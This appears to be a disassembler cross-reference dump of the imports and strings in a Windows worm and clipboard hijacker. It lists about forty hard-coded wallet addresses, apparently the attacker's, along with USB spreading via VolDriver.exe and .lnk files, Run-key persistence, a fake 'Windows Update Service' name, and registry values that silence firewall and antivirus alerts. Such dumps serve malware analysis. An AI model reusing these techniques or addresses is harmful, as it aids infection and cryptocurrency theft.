reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x402cb0	0x40d0e4	import	0x402ca0	KERNEL32.dll.lstrlenW
0x402cb6	0x40d168	import	0x402ca0	SHLWAPI.dll.StrStrW
0x402d79	0x402d8f	string	0x402ca0	_^]2
0x402d84	0x402d8f	string	0x402ca0	_^]2
0x402da2	0x402dad	string	0x402ca0	_^]2
0x402dcb	0x402dd6	string	0x402ca0	_^]2
0x402de0	0x40d32c	string	0x402ca0	bitcoincash:
0x402e00	0x40d348	string	0x402ca0	cosmos
0x402e20	0x40d358	string	0x402ca0	addr
0x402e5d	0x402d8f	string	0x402ca0	_^]2
0x402e63	0x40d32c	string	0x402ca0	bitcoincash:
0x402e75	0x40d2ac	import	0x402ca0	ntdll.dll.isalpha
0x402e7b	0x40d2a8	import	0x402ca0	ntdll.dll.isdigit
0x402e8f	0x402d8f	string	0x402ca0	_^]2
0x402e99	0x402d8f	string	0x402ca0	_^]2
0x402ea3	0x402d8f	string	0x402ca0	_^]2
0x402eb5	0x402ec9	string	0x402ca0	G;|$
0x402ec3	0x402d8f	string	0x402ca0	_^]2
0x402ee6	0x40d364	string	0x402ca0	13537267282679196401L
0x402eed	0x40d37c	string	0x402ca0	14T6qgnx6kQrxgr6asZR8UwvSYuLWUq3AHEUyArFbropQRWp
0x402ef7	0x40d3b0	string	0x402ca0	12ZcTiGZFWydqY4rDW6FbF1ArsBbdNaPxz
0x402f07	0x40d3d4	string	0x402ca0	3P99cyMypyaBthhNh1VLrtF7gjsHNxooth5
0x402f0e	0x40d3f8	string	0x402ca0	3NNJW9YnKichMXTVgAhrsD65veUBCfGC9m
0x402f19	0x40d41c	string	0x402ca0	qps3rmvkxc2qe0dxlffnxe6jvv90xtp8tcxquxva6v
0x402f24	0x40d448	string	0x402ca0	XkTJhYh432bGU2dMScEWmNLfyNTun3n52p
0x402f2f	0x40d46c	string	0x402ca0	DMfPdibKCp79N5sLqsLkqx7W7gyzS8dhK6
0x402f3a	0x40d490	string	0x402ca0	0xEa375AfbDa5e11af6F93932ef2dcDe2Cf38768Dd
0x402f45	0x40d4bc	string	0x402ca0	LhqqjWGpEEKDnZZVozMqYVax9zAzjQPJMW
0x402f50	0x40d4e0	string	0x402ca0	r3qS691ECDBqnCAa2Xq26HF55R38pyd2SU
0x402f5b	0x40d504	string	0x402ca0	TMumxbBnZn723FeqRnjZUbfvVvvmNaEyEY
0x402f70	0x40d54c	string	0x402ca0	tz1MQTA4y7zjDP8E3f7JxJpqA768QvhkQtwQ
0x402f7b	0x40d528	string	0x402ca0	t1J1JV7W2DgMbJCmzv3DKq69erCQ9sM7J8G
0x402f86	0x40d574	string	0x402ca0	hx76ca924ed3a86365aa684755d07ff587399a44a3
0x402f91	0x40d5a0	string	0x402ca0	QQyZHrgfAZUm6bqf19u3TZRfLU1szkWdAK
0x402f9c	0x40d5c4	string	0x402ca0	RWGY1zEN78ivFTZiMtiLLXYugjUM2Ezgdn
0x402fa7	0x40d5e8	string	0x402ca0	NDV3Q755N5RLBJIHD7O2MDQLHF7BGY7C5UFHJQJD
0x402fb2	0x40d614	string	0x402ca0	Aa6J2zX3FmXqZ1Vr6KB7SHEJeDQgZ9L1m9
0x402fbd	0x40d638	string	0x402ca0	SW7RcT7KzjDRZUeo33ULvuvgnk1vsfRu9h
0x402fcd	0x40d660	string	0x402ca0	zs1gdxkmsegruyeu72ehpfwgshmcup4sqxm7kafju9r7xjcfww8vlg7ar9rqraxmjhr9rdn2hj9v7w
0x402fd4	0x40d6b0	string	0x402ca0	zil1ks8wccts9uum532l6mt7zfn7v3grplu5plc7rd
0x402fdf	0x40d6dc	string	0x402ca0	s1QvSmGpRS7hxnjjfLvCkeDmy3MprJkpWBe
0x402fe4	0x40d168	import	0x402ca0	SHLWAPI.dll.StrStrW
0x402fea	0x40d700	string	0x402ca0	bitcoincash
0x402ff6	0x40d718	string	0x402ca0	bitcoincash:qps3rmvkxc2qe0dxlffnxe6jvv90xtp8tcxquxva6v
0x402ffb	0x40d348	string	0x402ca0	cosmos
0x403007	0x40d750	string	0x402ca0	cosmos18uv6asl0trdgeu0gajph8amh30qskjfeu7xsxf
0x403012	0x40d780	string	0x402ca0	46JBkCw1vWw2torA5cF6WwdPsjc4EziJE62PHWBKqkLmXVonQjSM5jk5zp1QfSjj2wPjzoLU64qGReNNouP2LLKBMJAZgbr
0x403017	0x40d358	string	0x402ca0	addr
0x403023	0x40d7e0	string	0x402ca0	addr1q82kgwmvcs3lcfaws5rq30cq94ek9nzqygcfj2a6045hpg8yjrm9xsu92x0lv30wldh80xqwtmxrc3jfetrzvnmstchq00s0sh
0x403031	0x40d848	string	0x402ca0	FWjKuczvp1fBH95y6c5j3koVX2TZDVR3V9
0x40303c	0x40d86c	string	0x402ca0	GB47TTMWVEURE5VW5NN56QFDW7X2OOSXKLL6KJIB4FQ3YMRUZXXE7P7W
0x403046	0x40d8a8	string	0x402ca0	GgY5yz2QmGk9jtk6WZ9dTYjt4oQumDpQS2
0x40305d	0x40d8d4	string	0x402ca0	bnb1ssq338y72jd2l0h53ujc8hn8ef9axa2d372gga
0x403062	0x40d900	string	0x402ca0	band
0x40306e	0x40d90c	string	0x402ca0	band17rdtnrylr8dlt88qpzqp8j588h5w2qnclf764u
0x40307f	0x40d940	string	0x402ca0	bc1q6rzlelsxd9xadajkjwqdwr72rl9ll7g29yxzqr
0x40308d	0x40d96c	string	0x402ca0	U30212907
0x403098	0x40d978	string	0x402ca0	E30940134
0x4030a3	0x40d984	string	0x402ca0	B30912949
0x4030a9	0x40d0c0	import	0x402ca0	KERNEL32.dll.lstrlenA
0x4030bc	0x40d0d0	import	0x402ca0	KERNEL32.dll.GlobalAlloc
0x4030c9	0x40d0c4	import	0x402ca0	KERNEL32.dll.GlobalLock
0x4030df	0x40d0e8	import	0x402ca0	KERNEL32.dll.GlobalUnlock
0x4030e7	0x40d1b4	import	0x402ca0	USER32.dll.OpenClipboard
0x4030f1	0x40d17c	import	0x402ca0	USER32.dll.EmptyClipboard
0x4030fa	0x40d1b8	import	0x402ca0	USER32.dll.SetClipboardData
0x403100	0x40d19c	import	0x402ca0	USER32.dll.CloseClipboard
0x40311f	0x40d0e4	import	0x403110	KERNEL32.dll.lstrlenW
0x403131	0x40d054	import	0x403110	KERNEL32.dll.GetCurrentProcessId
0x40315f	0x40d05c	import	0x403110	KERNEL32.dll.GetProcessHeaps
0x403187	0x40d064	import	0x403110	KERNEL32.dll.HeapCreate
0x4031a8	0x40d058	import	0x403110	KERNEL32.dll.HeapSetInformation
0x4031e0	0x40d06c	import	0x403110	KERNEL32.dll.HeapAlloc
0x40321b	0x40d0d8	import	0x403110	KERNEL32.dll.lstrcpynW
0x403253	0x40d0c0	import	0x403240	KERNEL32.dll.lstrlenA
0x40326f	0x40d0e0	import	0x403240	KERNEL32.dll.MultiByteToWideChar
0x40327f	0x40d054	import	0x403240	KERNEL32.dll.GetCurrentProcessId
0x4032ad	0x40d05c	import	0x403240	KERNEL32.dll.GetProcessHeaps
0x4032cf	0x40d054	import	0x403240	KERNEL32.dll.GetCurrentProcessId
0x4032db	0x40d064	import	0x403240	KERNEL32.dll.HeapCreate
0x4032fc	0x40d058	import	0x403240	KERNEL32.dll.HeapSetInformation
0x403334	0x40d06c	import	0x403240	KERNEL32.dll.HeapAlloc
0x403377	0x40d0e0	import	0x403240	KERNEL32.dll.MultiByteToWideChar
0x4033a0	0x40d054	import	0x403240	KERNEL32.dll.GetCurrentProcessId
0x4033ac	0x4033dc	string	0x403240	[_^3
0x4033b9	0x4033dc	string	0x403240	[_^3
0x4033d6	0x40d068	import	0x403240	KERNEL32.dll.HeapFree
0x403603	0x40d0c8	import	0x4035d0	KERNEL32.dll.GetModuleHandleW
0x403609	0x40d0d4	import	0x4035d0	KERNEL32.dll.Sleep
0x40360f	0x40d190	import	0x4035d0	USER32.dll.wsprintfW
0x403615	0x40d0cc	import	0x4035d0	KERNEL32.dll.GetTickCount
0x40361b	0x40d170	import	0x4035d0	USER32.dll.RegisterClassExW
0x403640	0x40d990	string	0x4035d0	%x%X
0x403675	0x40d1ac	import	0x4035d0	USER32.dll.CreateWindowExW
0x40367f	0x40d1a0	import	0x4035d0	USER32.dll.GetMessageA
0x403696	0x40d178	import	0x4035d0	USER32.dll.TranslateMessage
0x40369c	0x40d1b0	import	0x4035d0	USER32.dll.DispatchMessageA
0x4036c3	0x40d0dc	import	0x4035d0	KERNEL32.dll.ExitThread
0x4036f4	0x40377f	string	0x4036d0	_^]2
0x40379a	0x40d0fc	import	0x403790	KERNEL32.dll.InitializeCriticalSection
0x4037b4	0x40d104	import	0x403790	KERNEL32.dll.CreateFileW
0x4037c3	0x40385c	string	0x403790	_^][Y
0x4037d4	0x40d110	import	0x403790	KERNEL32.dll.CreateFileMappingW
0x4037e9	0x40d0f0	import	0x403790	KERNEL32.dll.MapViewOfFile
0x4037f8	0x40d0ec	import	0x403790	KERNEL32.dll.GetFileSize
0x403844	0x40d0f4	import	0x403790	KERNEL32.dll.UnmapViewOfFile
0x40384f	0x40d114	import	0x403790	KERNEL32.dll.CloseHandle
0x403856	0x40d114	import	0x403790	KERNEL32.dll.CloseHandle
0x403889	0x40d10c	import	0x403870	KERNEL32.dll.EnterCriticalSection
0x4038d3	0x40d100	import	0x403870	KERNEL32.dll.LeaveCriticalSection
0x4038eb	0x40d10c	import	0x4038e0	KERNEL32.dll.EnterCriticalSection
0x40392d	0x403920	string	0x4038e0	91t\r@
0x403953	0x40d054	import	0x4038e0	KERNEL32.dll.GetCurrentProcessId
0x403989	0x40d068	import	0x4038e0	KERNEL32.dll.HeapFree
0x403994	0x40d100	import	0x4038e0	KERNEL32.dll.LeaveCriticalSection
0x4039a6	0x40d22c	import	0x4038e0	WS2_32.dll.inet_ntoa
0x4039b1	0x40d100	import	0x4038e0	KERNEL32.dll.LeaveCriticalSection
0x4039c9	0x40d10c	import	0x4039c0	KERNEL32.dll.EnterCriticalSection
0x4039fc	0x4039f0	string	0x4039c0	98t\eF
0x403a04	0x40d100	import	0x4039c0	KERNEL32.dll.LeaveCriticalSection
0x403a4d	0x40d100	import	0x4039c0	KERNEL32.dll.LeaveCriticalSection
0x403a75	0x40d10c	import	0x403a60	KERNEL32.dll.EnterCriticalSection
0x403afe	0x40d054	import	0x403a60	KERNEL32.dll.GetCurrentProcessId
0x403b30	0x40d068	import	0x403a60	KERNEL32.dll.HeapFree
0x403b55	0x40d104	import	0x403a60	KERNEL32.dll.CreateFileW
0x403b70	0x40d0f8	import	0x403a60	KERNEL32.dll.WriteFile
0x403ba7	0x40d108	import	0x403a60	KERNEL32.dll.FlushFileBuffers
0x403bae	0x40d114	import	0x403a60	KERNEL32.dll.CloseHandle
0x403bb9	0x40d054	import	0x403a60	KERNEL32.dll.GetCurrentProcessId
0x403c03	0x40d068	import	0x403a60	KERNEL32.dll.HeapFree
0x403c63	0x40d068	import	0x403a60	KERNEL32.dll.HeapFree
0x403cb2	0x40d22c	import	0x403a60	WS2_32.dll.inet_ntoa
0x403cbd	0x40d100	import	0x403a60	KERNEL32.dll.LeaveCriticalSection
0x403cf7	0x40d11c	import	0x403cd0	KERNEL32.dll.GetDriveTypeW
0x403d1d	0x40d0b8	import	0x403cd0	KERNEL32.dll.QueryDosDeviceW
0x403d33	0x40d150	import	0x403cd0	SHLWAPI.dll.StrCmpNW
0x403d53	0x40d0a4	import	0x403cd0	KERNEL32.dll.lstrcpyW
0x403d76	0x40d128	import	0x403d70	KERNEL32.dll.GetLogicalDrives
0x403d7c	0x40d020	import	0x403d70	ADVAPI32.dll.RegOpenKeyExW
0x403d82	0x40d010	import	0x403d70	ADVAPI32.dll.RegQueryValueExW
0x403db6	0x40d9b0	string	0x403d70	Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
0x403dd8	0x40da28	string	0x403d70	NoDrives
0x403dfd	0x40d01c	import	0x403d70	ADVAPI32.dll.RegCloseKey
0x403e2f	0x40da3c	string	0x403e20	%s\VolDriver.exe
0x403e35	0x40d190	import	0x403e20	USER32.dll.wsprintfW
0x403e40	0x40d2b4	import	0x403e20	ole32.dll.CoInitialize
0x403e58	0x40d2c0	import	0x403e20	ole32.dll.CoCreateInstance
0x403e73	0x40da60	string	0x403e20	%windir%\explorer.exe
0x403e8b	0x40dae8	string	0x403e20	shell32.dll
0x403f24	0x40d124	import	0x403f10	KERNEL32.dll.CreateDirectoryW
0x403f31	0x40d190	import	0x403f10	USER32.dll.wsprintfW
0x403f3f	0x40da8c	string	0x403f10	%s\*
0x403f57	0x40d118	import	0x403f10	KERNEL32.dll.FindFirstFileW
0x403f64	0x404020	string	0x403f10	_^][
0x403f6a	0x40d134	import	0x403f10	KERNEL32.dll.lstrcmpW
0x403f9d	0x40daa4	string	0x403f10	%s\%s
0x403fb2	0x40daa4	string	0x403f10	%s\%s
0x403ff0	0x40d120	import	0x403f10	KERNEL32.dll.MoveFileExW
0x404000	0x40d0b0	import	0x403f10	KERNEL32.dll.FindNextFileW
0x404013	0x40d138	import	0x403f10	KERNEL32.dll.FindClose
0x40401a	0x40d0bc	import	0x403f10	KERNEL32.dll.RemoveDirectoryW
0x40404b	0x40d190	import	0x404030	USER32.dll.wsprintfW
0x40405a	0x40dab0	string	0x404030	%s.lnk
0x404072	0x40daa4	string	0x404030	%s\%s
0x404087	0x40dac0	string	0x404030	%s\%s\VolDriver.exe
0x40409f	0x40daa4	string	0x404030	%s\%s
0x4040af	0x40da8c	string	0x404030	%s\*
0x4040b7	0x40d14c	import	0x404030	SHLWAPI.dll.PathFileExistsW
0x4040ca	0x40d0d4	import	0x404030	KERNEL32.dll.Sleep
0x4040eb	0x40d124	import	0x404030	KERNEL32.dll.CreateDirectoryW
0x4040ff	0x40d0a0	import	0x404030	KERNEL32.dll.SetFileAttributesW
0x404129	0x40d12c	import	0x404030	KERNEL32.dll.CopyFileW
0x40413d	0x40d0a0	import	0x404030	KERNEL32.dll.SetFileAttributesW
0x404189	0x40d0a0	import	0x404030	KERNEL32.dll.SetFileAttributesW
0x40419c	0x40d118	import	0x404030	KERNEL32.dll.FindFirstFileW
0x4041a9	0x4043b4	string	0x404030	_^]2
0x4041af	0x40d0a8	import	0x404030	KERNEL32.dll.DeleteFileW
0x4041bc	0x40db00	string	0x404030	*.lnk
0x4041c4	0x40db0c	string	0x404030	*.vbs
0x4041cc	0x40db18	string	0x404030	*.js
0x4041d4	0x40db24	string	0x404030	*.inf*.scr
0x4041dc	0x40db3c	string	0x404030	*.com
0x4041e4	0x40db48	string	0x404030	*.jse
0x4041ec	0x40db54	string	0x404030	*.cmd
0x4041f4	0x40db60	string	0x404030	*.pif
0x4041fc	0x40db6c	string	0x404030	*.jar
0x404204	0x40db78	string	0x404030	*.dll
0x40420c	0x40db84	string	0x404030	*.vbe
0x404214	0x40db90	string	0x404030	*.bat
0x404228	0x40db9c	string	0x404030	Thumbs.db
0x404230	0x40dbb0	string	0x404030	$RECYCLE.BIN
0x404238	0x40dbcc	string	0x404030	desktop.ini
0x404240	0x40dbe4	string	0x404030	System Volume Information
0x404250	0x40d134	import	0x404030	KERNEL32.dll.lstrcmpW
0x40429d	0x40d0b4	import	0x404030	KERNEL32.dll.lstrcmpiW
0x4042c0	0x40d154	import	0x404030	SHLWAPI.dll.PathMatchSpecW
0x4042d8	0x40d14c	import	0x404030	SHLWAPI.dll.PathFileExistsW
0x4042f6	0x40daa4	string	0x404030	%s\%s
0x404313	0x40dc18	string	0x404030	%s\%s\%s
0x40434f	0x40daa4	string	0x404030	%s\%s
0x404367	0x40d0a0	import	0x404030	KERNEL32.dll.SetFileAttributesW
0x40438b	0x40d120	import	0x404030	KERNEL32.dll.MoveFileExW
0x40439b	0x40d0b0	import	0x404030	KERNEL32.dll.FindNextFileW
0x4043ae	0x40d138	import	0x404030	KERNEL32.dll.FindClose
0x4043e5	0x40d0d4	import	0x4043d0	KERNEL32.dll.Sleep
0x4043f7	0x40d130	import	0x4043d0	KERNEL32.dll.GetModuleFileNameW
0x4043fd	0x40d028	import	0x4043d0	KERNEL32.dll.GetVolumeInformationW
0x404403	0x40d190	import	0x4043d0	USER32.dll.wsprintfW
0x404480	0x40d0ac	import	0x4043d0	KERNEL32.dll.GetDiskFreeSpaceExW
0x40449e	0x40dc2c	string	0x4043d0	(%dGB)
0x4044b5	0x40dc3c	string	0x4043d0	Unnamed volume
0x4044d4	0x40dc5c	string	0x4043d0	%s%s
0x404517	0x40d0d4	import	0x4043d0	KERNEL32.dll.Sleep
0x404584	0x4072f0	string	0x404530	QSUV
0x40458e	0x40d054	import	0x404530	KERNEL32.dll.GetCurrentProcessId
0x4045c4	0x40d068	import	0x404530	KERNEL32.dll.HeapFree
0x40461f	0x40d054	import	0x4045e0	KERNEL32.dll.GetCurrentProcessId
0x404655	0x40d068	import	0x4045e0	KERNEL32.dll.HeapFree
0x40466e	0x4046a6	string	0x404660	_^][
0x404677	0x4038e0	string	0x404660	SUVWh
0x4046d7	0x4038e0	string	0x4046b0	SUVWh
0x404749	0x4072f0	string	0x4046b0	QSUV
0x404769	0x40d2c0	import	0x404760	ole32.dll.CoCreateInstance
0x40479f	0x4047a9	string	0x404760	3\tD$
0x4048d0	0x4048da	string	0x404760	3\tD$
0x4048e4	0x40dc68	string	0x404760	Microsoft Corporation
0x4048e9	0x40d144	import	0x404760	OLEAUT32.dll.SysReAllocString
0x40493a	0x40d140	import	0x404760	OLEAUT32.dll.SysStringLen
0x4049c5	0x40d2a4	import	0x4049a0	ntdll.dll.strstr
0x4049d9	0x40d054	import	0x4049a0	KERNEL32.dll.GetCurrentProcessId
0x404a0f	0x40d068	import	0x4049a0	KERNEL32.dll.HeapFree
0x404a2e	0x40d0d4	import	0x404a20	KERNEL32.dll.Sleep
0x404a49	0x40d130	import	0x404a20	KERNEL32.dll.GetModuleFileNameW
0x404a69	0x40dcec	string	0x404a20	winusvcs.exe
0x404a7b	0x40dd08	string	0x404a20	Microsoft Windows Update Service
0x404aa4	0x40d07c	import	0x404a20	KERNEL32.dll.CreateMutexA
0x404aaa	0x40d080	import	0x404a20	KERNEL32.dll.GetLastError
0x404ab9	0x40d088	import	0x404a20	KERNEL32.dll.ExitProcess
0x404ad4	0x40d158	import	0x404a20	SHLWAPI.dll.PathFindFileNameW
0x404ada	0x40d190	import	0x404a20	USER32.dll.wsprintfW
0x404aec	0x40dd4c	string	0x404a20	%s:Zone.Identifier
0x404b01	0x40d0a8	import	0x404a20	KERNEL32.dll.DeleteFileW
0x404b07	0x40dd74	string	0x404a20	winupsvc.exe
0x404b3b	0x40d01c	import	0x404a20	ADVAPI32.dll.RegCloseKey
0x404b56	0x40dd90	string	0x404a20	%userprofile%
0x404b5b	0x40d074	import	0x404a20	KERNEL32.dll.ExpandEnvironmentStringsW
0x404b75	0x40daa4	string	0x404a20	%s\%s
0x404b8f	0x40d12c	import	0x404a20	KERNEL32.dll.CopyFileW
0x404ba3	0x40d0a0	import	0x404a20	KERNEL32.dll.SetFileAttributesW
0x404bb5	0x40ddb0	string	0x404a20	Software\Microsoft\Windows\CurrentVersion\Run\
0x404bbf	0x40d020	import	0x404a20	ADVAPI32.dll.RegOpenKeyExW
0x404bfd	0x40d000	import	0x404a20	ADVAPI32.dll.RegSetValueExW
0x404c11	0x40d014	import	0x404a20	ADVAPI32.dll.RegOpenKeyExA
0x404c23	0x40de10	string	0x404a20	SOFTWARE\Microsoft\Security Center
0x404c2f	0x40d018	import	0x404a20	ADVAPI32.dll.RegSetValueExA
0x404c4c	0x40de34	string	0x404a20	FirewallOverride
0x404c63	0x40de48	string	0x404a20	FirewallDisableNotify
0x404c7a	0x40de60	string	0x404a20	AntiSpywareOverride
0x404c91	0x40de74	string	0x404a20	AntiVirusOverride
0x404ca8	0x40de88	string	0x404a20	AntiVirusDisableNotify
0x404cbf	0x40dea0	string	0x404a20	UpdatesOverride
0x404cd6	0x40deb0	string	0x404a20	UpdatesDisableNotify
0x404cf1	0x40dec8	string	0x404a20	SOFTWARE\Microsoft\Security Center\Svc
0x404d14	0x40de34	string	0x404a20	FirewallOverride
0x404d2b	0x40de48	string	0x404a20	FirewallDisableNotify
0x404d42	0x40de60	string	0x404a20	AntiSpywareOverride
0x404d59	0x40de74	string	0x404a20	AntiVirusOverride
0x404d70	0x40de88	string	0x404a20	AntiVirusDisableNotify
0x404d87	0x40dea0	string	0x404a20	UpdatesOverride
0x404d9e	0x40deb0	string	0x404a20	UpdatesDisableNotify
0x404df2	0x40d20c	import	0x404a20	WS2_32.dll.WSAStartup
0x404e05	0x40dd90	string	0x404a20	%userprofile%
0x404e0a	0x40d074	import	0x404a20	KERNEL32.dll.ExpandEnvironmentStringsW
0x404e10	0x40d190	import	0x404a20	USER32.dll.wsprintfW
0x404e1e	0x40def0	string	0x404a20	%s\nodescfg.dat
0x404e35	0x40df10	string	0x404a20	%s\cmdcfg.dat
0x404e41	0x40d078	import	0x404a20	KERNEL32.dll.CreateThread
0x404e7a	0x403790	string	0x404a20	QSUVWh
0x404e88	0x40d2bc	import	0x404a20	ole32.dll.CoInitializeEx
0x404e93	0x40d144	import	0x404a20	OLEAUT32.dll.SysReAllocString
0x404ea9	0x40d140	import	0x404a20	OLEAUT32.dll.SysStringLen
0x404eaf	0x40d2b8	import	0x404a20	ole32.dll.CoUninitialize
0x404ebd	0x40d084	import	0x404a20	KERNEL32.dll.CreateEventA
0x404f58	0x40570d	string	0x404f40	_^][
0x405b0f	0x405bab	string	0x405b00	_^][Ã blocks=Basic Latin,Latin-1 Supplement
0x405b1b	0x405bab	string	0x405b00	_^][Ã blocks=Basic Latin,Latin-1 Supplement
0x405c00	0x405ce9	string	0x405bb0	]^_[
0x4061a3	0x406258	string	0x406020	_^][
0x40622e	0x406258	string	0x406020	_^][
0x40643f	0x406482	string	0x4063d0	_^]Y
0x406492	0x40d054	import	0x406490	KERNEL32.dll.GetCurrentProcessId
0x4064b5	0x40d06c	import	0x406490	KERNEL32.dll.HeapAlloc
0x40654e	0x40d068	import	0x406490	KERNEL32.dll.HeapFree
0x40659d	0x40d060	import	0x406560	KERNEL32.dll.HeapValidate
0x40660a	0x40d05c	import	0x4065f0	KERNEL32.dll.GetProcessHeaps
0x406652	0x40d054	import	0x406650	KERNEL32.dll.GetCurrentProcessId
0x406671	0x40d064	import	0x406650	KERNEL32.dll.HeapCreate
0x406692	0x40d058	import	0x406650	KERNEL32.dll.HeapSetInformation
0x4066b7	0x40d054	import	0x4066b0	KERNEL32.dll.GetCurrentProcessId
0x4066f5	0x40d06c	import	0x4066b0	KERNEL32.dll.HeapAlloc
0x406723	0x40d054	import	0x406720	KERNEL32.dll.GetCurrentProcessId
0x406763	0x40d06c	import	0x406720	KERNEL32.dll.HeapAlloc
0x4067aa	0x40d054	import	0x4067a0	KERNEL32.dll.GetCurrentProcessId
0x406820	0x40d070	import	0x4067a0	KERNEL32.dll.HeapReAlloc
0x40682c	0x40d054	import	0x4067a0	KERNEL32.dll.GetCurrentProcessId
0x406861	0x40d068	import	0x4067a0	KERNEL32.dll.HeapFree
0x406878	0x40d06c	import	0x4067a0	KERNEL32.dll.HeapAlloc
0x4068b0	0x40d054	import	0x4068b0	KERNEL32.dll.GetCurrentProcessId
0x4068e6	0x40d068	import	0x4068b0	KERNEL32.dll.HeapFree
0x40697d	0x40d068	import	0x406970	KERNEL32.dll.HeapFree
0x406998	0x40d054	import	0x406970	KERNEL32.dll.GetCurrentProcessId
0x4069a4	0x4069cc	string	0x406970	G;|$
0x4069b1	0x4069cc	string	0x406970	G;|$
0x4069d3	0x40d054	import	0x406970	KERNEL32.dll.GetCurrentProcessId
0x4069df	0x406a0b	string	0x406970	_^][Ë blocks=Basic Latin,Latin-1 Supplement
0x4069f0	0x406a0b	string	0x406970	_^][Ë blocks=Basic Latin,Latin-1 Supplement
0x406ad7	0x40d234	import	0x406ab0	WS2_32.dll.htons
0x406ae7	0x40d230	import	0x406ab0	WS2_32.dll.inet_addr
0x406af9	0x40d248	import	0x406ab0	WS2_32.dll.gethostbyname
0x406b14	0x40d240	import	0x406ab0	WS2_32.dll.socket
0x406b29	0x40d228	import	0x406ab0	WS2_32.dll.connect
0x406b5e	0x40d238	import	0x406ab0	WS2_32.dll.getsockname
0x406b6b	0x40d23c	import	0x406ab0	WS2_32.dll.shutdown
0x406b72	0x40d244	import	0x406ab0	WS2_32.dll.closesocket
